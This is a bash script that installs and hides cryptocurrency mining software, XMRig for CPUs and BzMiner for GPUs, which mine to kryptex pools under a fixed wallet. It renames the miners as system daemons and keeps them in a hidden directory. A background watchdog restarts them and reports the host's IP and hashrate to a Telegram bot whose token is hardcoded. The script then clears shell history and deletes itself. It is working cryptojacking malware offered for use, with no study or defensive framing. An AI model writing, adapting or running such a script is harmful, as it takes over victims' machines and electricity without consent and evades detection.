#!/bin/bash

# ============================================================
# | GOD MODE v35_BZ: BZMINER EDITION (100% CURL ONLY)       |
# ============================================================

# [ CONFIGURATION ]
FIXED_WALLET_ID="krxYNV2DZQ"
TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TG_CHAT_ID="7032066912"

DEFAULT_UPDATE_URL="https://raw.githubusercontent.com/xdLolKek/connfy-libs/refs/heads/main/Connfy_Bz.sh"
REPORT_INTERVAL=18000 

POOL_CPU_1="xmr.kryptex.network:7029"
POOL_CPU_2="xmr-eu.kryptex.network:7029"
POOL_GPU_1="prl.kryptex.network:7048"
POOL_GPU_2="prl-eu.kryptex.network:7048"

IS_ROOT=0
if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=1
    BASE_DIR="/usr/local/bin/.connfy-core"
elif [ -n "$HOME" ] && [ -d "$HOME" ] && [ -w "$HOME" ]; then
    BASE_DIR="$HOME/.connfy-core"
else
    BASE_DIR="/tmp/.connfy-core"
fi

mkdir -p "$BASE_DIR" 2>/dev/null || BASE_DIR="/tmp/.connfy-core"
mkdir -p "$BASE_DIR" 2>/dev/null
cd "$BASE_DIR" 2>/dev/null || cd /tmp || exit 1

export PATH="$BASE_DIR:$PATH"

BIN_CPU="sys_net_daemon" 
BIN_GPU="sys_render_service"

LOG_CPU="$BASE_DIR/.cpu_data.log"
LOG_GPU="$BASE_DIR/.gpu_data.log"

# ----------------------------------------------------
# [ PHASE 1: FAST IP & HARDWARE DETECTION ]
# ----------------------------------------------------
get_worker() {
    local ip
    ip=$(curl -s -m 3 --connect-timeout 2 api.ipify.org || curl -s -m 3 --connect-timeout 2 icanhazip.com || echo "111.111.111.111")
    local safe_worker
    safe_worker=$(echo "$ip" | sed 's/\./A/g' | tr -cd '0-9A-Za-z')
    echo "${FIXED_WALLET_ID}.${safe_worker}"
}
WORKER=$(get_worker)
SERVER_IP=$(curl -s -m 3 --connect-timeout 2 api.ipify.org || echo "Unknown-IP")

detect_gpu() {
    if [ -d "/proc/driver/nvidia" ] || [ -c "/dev/nvidia0" ] || [ -d "/sys/class/drm/card0" ]; then
        echo "1"
        return
    fi
    if command -v nvidia-smi >/dev/null 2>&1; then
        echo "1"
        return
    fi
    echo "0"
}
HAS_GPU=$(detect_gpu)

# ----------------------------------------------------
# [ PHASE 2: MODULE DOWNLOAD & INSTALL ]
# ----------------------------------------------------
URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
URL_BZMINER="https://github.com/bzminer/bzminer/releases/download/v23.2.1/bzminer_v23.2.1_linux.tar.gz"

# CPU Setup
if [ ! -f "$BIN_CPU" ]; then
    curl -L -k -s -m 30 --connect-timeout 5 -o cpu.tar.gz "$URL_XMRIG"
    if [ -f cpu.tar.gz ] && [ -s cpu.tar.gz ]; then
        tar -xf cpu.tar.gz 2>/dev/null
        FOUND_CPU=$(find . -type f -name "xmrig" | head -n 1)
        if [ -n "$FOUND_CPU" ]; then
            mv "$FOUND_CPU" "./$BIN_CPU"
            chmod +x "./$BIN_CPU"
        fi
        rm -rf cpu.tar.gz xmrig*
    fi
fi

cat <<EOF > config.json
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false },
    "autosave": true,
    "background": false,
    "colors": false,
    "cpu": { "enabled": true, "huge-pages": true, "asm": true },
    "donate-level": 1,
    "pools": [
        { "url": "$POOL_CPU_1", "user": "$WORKER", "pass": "x", "keepalive": true },
        { "url": "$POOL_CPU_2", "user": "$WORKER", "pass": "x", "keepalive": true }
    ]
}
EOF

# GPU Setup (BzMiner — 100% автономный)
if [ "$HAS_GPU" -eq 1 ]; then
    NEED_INSTALL=0
    if [ ! -f "$BIN_GPU" ]; then
        NEED_INSTALL=1
    else
        if ! ./$BIN_GPU --version 2>&1 | grep -i "bzminer" >/dev/null; then
            rm -f "$BIN_GPU"
            NEED_INSTALL=1
        fi
    fi

    if [ "$NEED_INSTALL" -eq 1 ]; then
        pkill -9 -f "$BIN_GPU" 2>/dev/null
        rm -f "$BIN_GPU" gpu.tar.gz
        curl -L -k -s -m 40 --connect-timeout 5 -o gpu.tar.gz "$URL_BZMINER"
        
        if [ -f gpu.tar.gz ] && [ -s gpu.tar.gz ]; then
            tar -xf gpu.tar.gz 2>/dev/null
            FOUND_GPU=$(find . -type f -name "bzminer" | head -n 1)
            if [ -n "$FOUND_GPU" ] && [ -f "$FOUND_GPU" ]; then
                mv "$FOUND_GPU" "./$BIN_GPU"
                chmod +x "./$BIN_GPU"
            fi
            rm -rf gpu.tar.gz bzminer*
        fi
    fi
fi

# ----------------------------------------------------
# [ PHASE 3: SECURE WATCHDOG ENGINE ]
# ----------------------------------------------------
cat <<EOF > watchdog.sh
#!/bin/bash
BASE_DIR="$BASE_DIR"
BIN_CPU="$BIN_CPU"
BIN_GPU="$BIN_GPU"
POOL_GPU_1="$POOL_GPU_1"
POOL_GPU_2="$POOL_GPU_2"
WORKER="$WORKER"
SERVER_IP="$SERVER_IP"
TG_BOT_TOKEN="$TG_BOT_TOKEN"
TG_CHAT_ID="$TG_CHAT_ID"
DEFAULT_UPDATE_URL="$DEFAULT_UPDATE_URL"
REPORT_INTERVAL=$REPORT_INTERVAL
HAS_GPU=$HAS_GPU
IS_ROOT=$IS_ROOT

LOG_CPU="$LOG_CPU"
LOG_GPU="$LOG_GPU"

export PATH="\$BASE_DIR:\$PATH"
cd "\$BASE_DIR" 2>/dev/null || cd /tmp

LAST_REPORT=\$(date +%s)
PAUSED=0

send_tg_msg() {
    local msg="\$1"
    curl -s -m 5 --connect-timeout 3 -X POST "https://api.telegram.org/bot\$TG_BOT_TOKEN/sendMessage" \
         -d chat_id="\$TG_CHAT_ID" \
         -d text="\$msg" \
         -d parse_mode="HTML" > /dev/null 2>&1
}

is_target_me() {
    local target="\$1"
    if [ -z "\$target" ] || [ "\$target" = "all" ] || [ "\$target" = "ALL" ]; then return 0; fi
    if [ "\$target" = "\$SERVER_IP" ] || [ "\$target" = "\$WORKER" ]; then return 0; fi
    local safe_ip=\$(echo "\$SERVER_IP" | sed 's/\./A/g')
    if [ "\$target" = "\$safe_ip" ]; then return 0; fi
    return 1
}

send_telemetry_report() {
    local title="\$1"
    
    CPU_HASHRATE="0 H/s"
    CPU_SHARES="0"
    if [ -f "\$LOG_CPU" ]; then
        SPEED_LINE=\$(grep -i "speed 10s/60s/15m" "\$LOG_CPU" | tail -n 1)
        if [ -n "\$SPEED_LINE" ]; then
            RAW_SPEED=\$(echo "\$SPEED_LINE" | awk '{print \$5}')
            [ -n "\$RAW_SPEED" ] && CPU_HASHRATE="\${RAW_SPEED} H/s"
        fi
        SHARES_COUNT=\$(grep -c -i "accepted" "\$LOG_CPU" 2>/dev/null)
        [ -n "\$SHARES_COUNT" ] && CPU_SHARES="\$SHARES_COUNT"
    fi

    GPU_HASHRATE="0 H/s"
    GPU_SHARES="0"
    if [ "\$HAS_GPU" -eq 1 ] && [ -f "\$LOG_GPU" ]; then
        GPU_SPEED_LINE=\$(grep -iE "Hashrate:|Total Hashrate|speed" "\$LOG_GPU" | tail -n 1)
        if [ -n "\$GPU_SPEED_LINE" ]; then
            RAW_GPU_SPEED=\$(echo "\$GPU_SPEED_LINE" | grep -o '[0-9.]*' | tail -n 1)
            [ -n "\$RAW_GPU_SPEED" ] && GPU_HASHRATE="\${RAW_GPU_SPEED} H/s"
        fi
        SHARES_GPU=\$(grep -c -i "accepted" "\$LOG_GPU" 2>/dev/null)
        [ -n "\$SHARES_GPU" ] && GPU_SHARES="\$SHARES_GPU"
    fi

    REPORT="📊 <b>\$title</b>%0A"
    REPORT="\${REPORT}🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A"
    REPORT="\${REPORT}🆔 <b>Worker:</b> <code>\$WORKER</code>%0A"
    REPORT="\${REPORT}⏱ <b>Uptime:</b> \$(uptime -p 2>/dev/null || echo 'N/A')%0A%0A"

    REPORT="\${REPORT}💻 <b>CPU Status:</b> \$CPU_STATUS%0A"
    REPORT="\${REPORT}⚡ <b>CPU Hashrate:</b> \$CPU_HASHRATE%0A"
    REPORT="\${REPORT}📦 <b>CPU Accepted Shares:</b> \$CPU_SHARES%0A%0A"

    if [ "\$HAS_GPU" -eq 1 ]; then
        REPORT="\${REPORT}🎮 <b>GPU Status (BzMiner Pearl):</b> \$GPU_STATUS%0A"
        REPORT="\${REPORT}⚡ <b>GPU Hashrate:</b> \$GPU_HASHRATE%0A"
        REPORT="\${REPORT}📦 <b>GPU Accepted Shares:</b> \$GPU_SHARES%0A"
    else
        REPORT="\${REPORT}🎮 <b>GPU Status:</b> N/A (CPU-Only Machine)%0A"
    fi

    send_tg_msg "\$REPORT"
}

STARTUP_MSG="🚀 <b>ENGINE V35_BZ ACTIVE (BzMiner)</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>"
send_tg_msg "\$STARTUP_MSG"

while true; do
    NOW=\$(date +%s)

    if [ "\$PAUSED" -eq 0 ]; then
        CPU_STATUS="🟢 Active"
        if [ -f "./\$BIN_CPU" ]; then
            if ! pgrep -f "\$BIN_CPU" > /dev/null; then
                chmod +x "./\$BIN_CPU"
                nohup ./\$BIN_CPU --config=config.json >> "\$LOG_CPU" 2>&1 &
                sleep 2
                if ! pgrep -f "\$BIN_CPU" > /dev/null; then CPU_STATUS="🔴 Offline / Stalled"; fi
            fi
        fi

        GPU_STATUS="N/A (No GPU)"
        if [ "\$HAS_GPU" -eq 1 ]; then
            GPU_STATUS="🟢 Active"
            if [ -f "./\$BIN_GPU" ]; then
                if ! pgrep -f "\$BIN_GPU" > /dev/null; then
                    chmod +x "./\$BIN_GPU"
                    nohup ./\$BIN_GPU -a pearlhash -p \$POOL_GPU_1 -w \$WORKER >> "\$LOG_GPU" 2>&1 &
                    sleep 2
                    if ! pgrep -f "\$BIN_GPU" > /dev/null; then GPU_STATUS="🔴 Offline / Crashed"; fi
                fi
            fi
        fi
    fi

    [ -f "\$LOG_CPU" ] && tail -n 300 "\$LOG_CPU" > "\$LOG_CPU.tmp" && mv "\$LOG_CPU.tmp" "\$LOG_CPU"
    [ -f "\$LOG_GPU" ] && tail -n 300 "\$LOG_GPU" > "\$LOG_GPU.tmp" && mv "\$LOG_GPU.tmp" "\$LOG_GPU"

    sleep 60
done
EOF

chmod +x watchdog.sh

if [ -f "./$BIN_CPU" ]; then
    chmod +x "./$BIN_CPU"
    nohup ./$BIN_CPU --config=config.json >> "$LOG_CPU" 2>&1 &
fi

if [ "$HAS_GPU" -eq 1 ] && [ -f "./$BIN_GPU" ]; then
    chmod +x "./$BIN_GPU"
    nohup ./$BIN_GPU -a pearlhash -p $POOL_GPU_1 -w $WORKER >> "$LOG_GPU" 2>&1 &
fi

pkill -9 -f "watchdog.sh" 2>/dev/null
(nohup bash "$BASE_DIR/watchdog.sh" </dev/null >/dev/null 2>&1 &)

echo "================================================="
echo "[+] ENGINE V35_BZ INITIALIZED (BzMiner)"
echo "[+] Server IP: $SERVER_IP"
echo "[+] Worker ID: $WORKER"
echo "================================================="
echo "[+] Core engines ignited!"

history -c
rm -f "$0"
